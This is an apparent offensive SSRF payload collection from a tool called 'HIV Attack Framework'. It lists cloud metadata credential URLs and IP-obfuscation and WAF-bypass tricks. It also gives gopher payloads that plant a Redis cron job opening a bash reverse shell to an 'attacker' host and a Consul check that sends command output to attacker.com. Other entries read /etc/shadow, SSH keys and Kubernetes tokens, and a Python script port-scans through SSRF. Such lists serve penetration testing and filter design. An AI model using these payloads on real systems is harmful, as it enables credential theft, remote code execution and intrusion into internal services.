# SSRF Payload Database — HIV Attack Framework

> 100+ functional SSRF payloads for authorized security research.

---

## 1. Cloud Metadata Endpoints

### 1.1 AWS (Amazon Web Services)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/instance-type
http://169.254.169.254/latest/meta-data/placement/availability-zone
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
http://169.254.169.254/latest/meta-data/iam/info
http://169.254.169.254/latest/meta-data/services/domain
# IMDSv2 (requires token — test if v1 still enabled):
# Step 1: curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# Step 2: curl -H "X-aws-ec2-metadata-token: TOKEN" http://169.254.169.254/latest/meta-data/
```

### 1.2 GCP (Google Cloud Platform)
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/instance/name
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
# Requires header: Metadata-Flavor: Google
# SSRF trick: use Gopher or headers injection to add this header
http://metadata.google.internal/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### 1.3 Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/
http://169.254.169.254/metadata/scheduledevents?api-version=2017-11-01
# Requires header: Metadata: true
```

### 1.4 DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/vendor-data
```

### 1.5 Oracle Cloud
```
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v1/instance/metadata/
http://169.254.169.254/opc/v1/identity/
http://169.254.169.254/opc/v2/instance/
```

### 1.6 Alibaba Cloud (Aliyun)
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
http://100.100.100.200/latest/meta-data/public-ipv4
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://100.100.100.200/latest/user-data
```

---

## 2. IP Obfuscation for 127.0.0.1

```
# Decimal notation
http://2130706433/
http://2130706433:80/
# 127.0.0.1 = 2130706433 (decimal)

# Octal
http://0177.0.0.1/
http://0177.00.00.01/
http://0x7f000001/

# Hex
http://0x7f000001/
http://0x7f.0x0.0x0.0x1/
http://0x7f000001:80/

# Mixed encoding
http://127.0x0.0.1/
http://127.0.0.0x1/

# IPv6 equivalents
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[::ffff:7f00:1]/
http://[0000::1]/
http://[0:0:0:0:0:0:0:1]/

# URL encoding
http://%31%32%37%2e%30%2e%30%2e%31/
http://127.0.0.1%09/  (tab after IP)
http://127.0.0.1%20/  (space after IP)

# Localhost aliases (DNS)
http://localhost/
http://localhosT/
http://LOCALHOST/
http://localhost.attacker.com/ (if DNS controlled)

# Loopback range
http://127.0.0.2/
http://127.1.1.1/
http://127.255.255.255/
http://127.100.200.50/
```

## 2.1 IP Obfuscation for 169.254.169.254

```
# Decimal
http://2852039166/

# Hex
http://0xa9fea9fe/
http://0xa9.0xfe.0xa9.0xfe/

# Octal
http://0251.0376.0251.0376/

# IPv6
http://[::ffff:169.254.169.254]/
http://[::ffff:a9fe:a9fe]/

# URL encoded
http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/

# Mixed
http://169.254.169.254%09/
http://169.0254.169.254/

# DNS rebinding (use rebind.it or similar service)
# rebind.it provides domains that resolve to 169.254.169.254 on second query
```

---

## 3. Protocol Handlers

### HTTP / HTTPS
```
http://127.0.0.1/
http://127.0.0.1:22/
http://127.0.0.1:3306/
https://127.0.0.1:443/
```

### dict:// (port scanning, banner grabbing)
```
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:11211/stats
dict://127.0.0.1:22/
dict://127.0.0.1:3306/
dict://127.0.0.1:5432/
```

### gopher:// (SSRF to inject arbitrary data)
```
# HTTP request via gopher
gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0aHost:localhost%0d%0a%0d%0a

# Redis via gopher (unauthenticated)
gopher://127.0.0.1:6379/_%2A1%0d%0a%248%0d%0aflushall%0d%0a
gopher://127.0.0.1:6379/_%2A3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2435%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker/80 0>&1%0a%0a%0a%0d%0a

# MySQL via gopher (unauthenticated)
gopher://127.0.0.1:3306/_<MySQL%20handshake%20binary>

# SMTP via gopher
gopher://127.0.0.1:25/_EHLO%20localhost%0d%0aMAIL%20FROM:attack@attacker.com%0d%0aRCPT%20TO:victim@target.com%0d%0aDATA%0d%0aSubject:Test%0d%0a%0d%0aBody%0d%0a.%0d%0a
```

### file:// (local file read)
```
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/self/maps
file:///proc/net/tcp
file:///proc/net/fib_trie
file:///var/www/html/config.php
file:///var/www/html/wp-config.php
file:///etc/nginx/nginx.conf
file:///etc/apache2/sites-enabled/000-default.conf
file:///home/user/.ssh/id_rsa
file://localhost/etc/passwd
```

### ftp://
```
ftp://127.0.0.1/
ftp://127.0.0.1:21/
ftp://attacker.com/  (for FTP smuggling)
```

### ldap://
```
ldap://127.0.0.1:389/
ldap://127.0.0.1:389/%00
ldaps://127.0.0.1:636/
```

### sftp://
```
sftp://attacker.com:22/
```

### tftp://
```
tftp://attacker.com:69/test
```

---

## 4. Internal Service Probes

### 4.1 Redis
```
http://127.0.0.1:6379/
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:6379/CONFIG GET *
# Via gopher — write cron job for RCE:
gopher://127.0.0.1:6379/_%2A1%0d%0a%248%0d%0aflushall%0d%0a%2A3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2460%0d%0a%0a%0a*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/80 0>&1%0a%0a%0d%0a%2A4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2416%0d%0a/var/spool/cron/%0d%0a%2A4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%244%0d%0aroot%0d%0a%2A1%0d%0a%244%0d%0asave%0d%0a
```

### 4.2 Elasticsearch
```
http://127.0.0.1:9200/
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_cluster/health
http://127.0.0.1:9200/_all/_search?q=*
http://127.0.0.1:9200/_all/_mapping
http://127.0.0.1:9200/logstash-*/_search?q=password
```

### 4.3 Kubernetes API
```
http://127.0.0.1:8080/api/v1/
http://127.0.0.1:8080/api/v1/namespaces/
http://127.0.0.1:8080/api/v1/pods/
http://127.0.0.1:8080/api/v1/secrets/
http://10.96.0.1:443/api/v1/namespaces/default/secrets/
# K8s service account token location:
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
# Kubernetes metadata via cloud IMDS:
http://169.254.169.254/latest/meta-data/  (if on AWS)
```

### 4.4 Docker
```
http://127.0.0.1:2375/
http://127.0.0.1:2375/version
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/images/json
http://127.0.0.1:2375/info
http://127.0.0.1:2376/  (TLS Docker daemon)
# Via SSRF — exec into container:
POST http://127.0.0.1:2375/containers/CONTAINER_ID/exec
{"Cmd":["id"],"AttachStdout":true,"AttachStderr":true}
```

### 4.5 Jenkins
```
http://127.0.0.1:8080/
http://127.0.0.1:8080/api/json
http://127.0.0.1:8080/script  (Groovy console — RCE)
http://127.0.0.1:8080/credentials/
http://127.0.0.1:8080/manage
http://127.0.0.1:8080/asynchPeople/
```

### 4.6 Consul
```
http://127.0.0.1:8500/
http://127.0.0.1:8500/v1/agent/self
http://127.0.0.1:8500/v1/catalog/services
http://127.0.0.1:8500/v1/kv/
http://127.0.0.1:8500/v1/agent/checks
# Consul RCE via script check:
PUT http://127.0.0.1:8500/v1/agent/check/register
{"ID":"x","Name":"x","Script":"curl attacker.com/$(id|base64)","Interval":"10s"}
```

### 4.7 Other Internal Services
```
# Memcached
http://127.0.0.1:11211/
dict://127.0.0.1:11211/stats

# MongoDB
http://127.0.0.1:27017/

# PostgreSQL
http://127.0.0.1:5432/

# MySQL
http://127.0.0.1:3306/

# Zookeeper
http://127.0.0.1:2181/
dict://127.0.0.1:2181/stat

# Prometheus
http://127.0.0.1:9090/
http://127.0.0.1:9090/api/v1/targets

# Grafana
http://127.0.0.1:3000/

# etcd
http://127.0.0.1:2379/v2/keys/
http://127.0.0.1:2380/

# Vault (HashiCorp)
http://127.0.0.1:8200/v1/sys/health
http://127.0.0.1:8200/v1/secret/
```

---

## 5. Blind SSRF Confirmation Techniques

### 5.1 DNS-Based (OOB Confirmation)
```
# Use interactsh or Burp Collaborator
http://YOUR-COLLAB-ID.oast.fun/
https://YOUR-COLLAB-ID.oast.fun/
# Any DNS query to YOUR-COLLAB-ID.oast.fun confirms SSRF

# DNS via URL params
?url=http://YOUR-COLLAB-ID.oast.fun/
?dest=http://YOUR-COLLAB-ID.oast.fun/
?redirect=http://YOUR-COLLAB-ID.oast.fun/
?uri=http://YOUR-COLLAB-ID.oast.fun/
?path=http://YOUR-COLLAB-ID.oast.fun/
?continue=http://YOUR-COLLAB-ID.oast.fun/
?return=http://YOUR-COLLAB-ID.oast.fun/
?r=http://YOUR-COLLAB-ID.oast.fun/
?u=http://YOUR-COLLAB-ID.oast.fun/
?link=http://YOUR-COLLAB-ID.oast.fun/
?fetch=http://YOUR-COLLAB-ID.oast.fun/
?proxy=http://YOUR-COLLAB-ID.oast.fun/
?callback=http://YOUR-COLLAB-ID.oast.fun/
?load=http://YOUR-COLLAB-ID.oast.fun/
?download=http://YOUR-COLLAB-ID.oast.fun/
?target=http://YOUR-COLLAB-ID.oast.fun/
?image=http://YOUR-COLLAB-ID.oast.fun/
?endpoint=http://YOUR-COLLAB-ID.oast.fun/
?document=http://YOUR-COLLAB-ID.oast.fun/
?reference=http://YOUR-COLLAB-ID.oast.fun/
```

### 5.2 Timing-Based (Blind SSRF Port Scan)
```python
# Compare response time: open port returns fast (connection refused or banner),
# filtered/closed port returns after timeout
import requests
import time

target_url = "https://target.com/fetch?url="
ports_to_test = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200]

for port in ports_to_test:
    start = time.time()
    try:
        r = requests.get(f"{target_url}http://127.0.0.1:{port}/", timeout=5)
        elapsed = time.time() - start
        print(f"Port {port}: {elapsed:.2f}s status={r.status_code} len={len(r.text)}")
    except:
        elapsed = time.time() - start
        print(f"Port {port}: {elapsed:.2f}s TIMEOUT/ERROR")
```

### 5.3 Content-Based (Semi-Blind)
```
# If response includes fetched content:
http://127.0.0.1:22/     --> SSH-2.0-OpenSSH banner in response body
http://127.0.0.1:6379/   --> -ERR wrong number of arguments
http://127.0.0.1:9200/   --> {"name":"...","cluster_name":"..."}
http://127.0.0.1:2375/   --> {"ID":"...","Containers":...}

# Error message differences:
# "Connection refused" = port closed
# "Connection timeout" = port filtered
# "No route to host" = host unreachable
# Actual content = port open and responsive
```

---

## 6. WAF Bypass for URL Filters

### 6.1 Domain/IP Filter Bypass
```
# If blocking "169.254.169.254":
# Use decimal: http://2852039166/
# Use hex:     http://0xa9fea9fe/
# Use octal:   http://0251.0376.0251.0376/
# Use IPv6:    http://[::ffff:a9fe:a9fe]/

# If blocking "localhost" or "127.0.0.1":
# Use 127.0.0.2 through 127.255.255.255
# Use 0.0.0.0 (binds to all, resolves to localhost on many systems)
# Use decimal: http://2130706433/
# Use IPv6:    http://[::1]/

# Bypass allowlist via open redirect on whitelisted domain:
https://whitelisted.com/redirect?url=http://169.254.169.254/

# Bypass via DNS rebinding:
# Register domain that initially resolves to your public IP,
# then switches to 169.254.169.254 after cache expires

# Bypass via URL parsing confusion:
http://attacker.com@169.254.169.254/    # parser sees host as attacker.com but requests 169.254.169.254
http://169.254.169.254#attacker.com
http://[email:password@169.254.169.254]/
```

### 6.2 Scheme Filter Bypass
```
# If blocking http://:
HTTP://169.254.169.254/
hTTp://169.254.169.254/
Http://169.254.169.254/

# URL encoded scheme
h%74tp://169.254.169.254/
ht%74p://169.254.169.254/

# Double encoding
h%2574tp://169.254.169.254/

# Protocol confusion (if app supports multiple schemes)
dict://169.254.169.254:80/latest/meta-data/
gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0d%0aHost:169.254.169.254%0d%0a%0d%0a

# Schemeless
//169.254.169.254/latest/meta-data/
```

### 6.3 Header Injection for SSRF
```
# If app validates URL but not headers:
X-Forwarded-For: 169.254.169.254
X-Real-IP: 169.254.169.254
X-Original-URL: http://169.254.169.254/
X-Forwarded-Host: 169.254.169.254
X-Host: 169.254.169.254
X-Custom-IP-Authorization: 127.0.0.1

# Host header SSRF (when app uses Host for backend requests)
Host: 169.254.169.254
```

---

## 7. SSRF via Common Parameters

```bash
# Comprehensive parameter list to test for SSRF:
url=
dest=
redirect=
uri=
path=
continue=
return=
return_url=
returnUrl=
returnURL=
go=
next=
r=
u=
link=
fetch=
proxy=
callback=
load=
download=
target=
image=
img=
picture=
img_url=
image_url=
document=
file=
page=
open=
show=
window=
feed=
host=
site=
html=
view=
reference=
source=
src=
data=
val=
value=
var=
out=
output=
dir=
navigation=
to=
```

---

*HIV Framework v2.0 — SSRF Payload Database | 100+ payloads | Authorized research only*
